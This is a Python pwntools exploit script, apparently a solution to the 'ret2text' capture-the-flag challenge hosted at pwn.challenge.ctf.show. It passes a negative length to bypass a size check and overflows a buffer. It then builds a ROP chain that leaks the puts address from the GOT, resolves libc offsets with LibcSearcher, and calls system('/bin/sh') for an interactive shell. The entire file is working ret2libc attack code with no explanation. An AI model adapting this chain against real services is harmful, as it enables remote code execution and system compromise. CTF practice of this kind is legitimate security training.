from multiprocessing import context
from pwn import *
from LibcSearcher import *
p=remote('pwn.challenge.ctf.show',28111)
# p=process('./ret2text')
elf=ELF('./ret2text')
context.log_level='debug'
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_addr=elf.symbols['main']
pop_rdi=0x0000000000400833
back_door=0x00000000004006E6
p.recvuntil(b'[+]Please input the length of your name:\n')
p.sendline(b'-1')
p.recvuntil(b'[+]What\'s u name?\n')
payload=b'a'*0x18+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendline(payload)
# p.interactive()
puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
libc=LibcSearcher('puts',puts_addr)
libc_base=puts_addr-libc.dump('puts')
system_addr=libc_base+libc.dump('system')
binsh_addr=libc_base+libc.dump('str_bin_sh')
print(hex(puts_addr))
# p.interactive()
p.recvuntil(b'[+]Please input the length of your name:\n')
p.sendline(b'-1')
p.recvuntil(b'[+]What\'s u name?\n')
payload=b'a'*0x18+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
p.sendline(payload)
p.interactive()
